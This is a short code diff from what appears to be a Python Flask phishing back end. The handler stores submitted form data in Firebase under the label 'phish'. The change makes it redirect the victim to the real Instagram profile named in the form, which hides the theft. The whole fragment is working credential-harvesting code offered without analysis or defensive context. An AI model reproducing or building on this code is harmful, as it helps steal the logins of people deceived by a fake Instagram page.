@@ -19,7 +19,7 @@ def process():
         data = request.form
         firebase.post("phish",data)
         
-        return data
+        return redirect(f"http://instagram.com/{data['name']}")
 
 
 
